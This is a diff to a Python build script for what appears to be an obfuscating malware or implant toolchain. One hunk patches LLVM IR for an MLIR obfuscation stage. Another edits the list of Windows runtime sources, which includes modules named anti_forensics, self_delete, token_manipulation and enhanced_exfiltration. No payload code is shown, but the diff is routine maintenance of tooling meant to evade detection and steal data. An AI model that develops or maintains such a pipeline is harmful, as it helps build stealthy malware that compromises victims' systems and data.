@@ -293,6 +293,12 @@ def stage_mlir_obfuscate(ir_path, build_dir, custom_passes=None):
     mlir_path = build_dir / "output.mlir"
     mlir_obf_path = build_dir / "output_obf.mlir"
 
+    # Fix pointer array initialization: convert i8* 0 to i8* null for MLIR compatibility
+    ir_content = ir_path.read_text()
+    ir_content = ir_content.replace("i8* 0,", "i8* null,")
+    ir_content = ir_content.replace("i8* 0]", "i8* null]")
+    ir_path.write_text(ir_content)
+
     run([str(TOOLCHAIN / "bin" / "mlir-translate"), "--import-llvm", str(ir_path), "-o", str(mlir_path)],
         "LLVM IR -> MLIR")
     log("MLIR", f"MLIR: {mlir_path.stat().st_size} bytes, {len(mlir_path.read_text().splitlines())} lines")
@@ -518,7 +524,6 @@ def stage_compile_runtime(build_dir, platform="windows"):
         WIN / "audit" / "audit.c",
         WIN / "anti_forensics" / "forensics.c",
         WIN / "anti_forensics" / "logs.c",
-        WIN / "anti_forensics" / "logs_cleanup.c",
         WIN / "anti_forensics" / "self_delete.c",
         WIN / "security" / "token_manipulation.c",
         WIN / "exfil" / "enhanced_exfiltration.c",
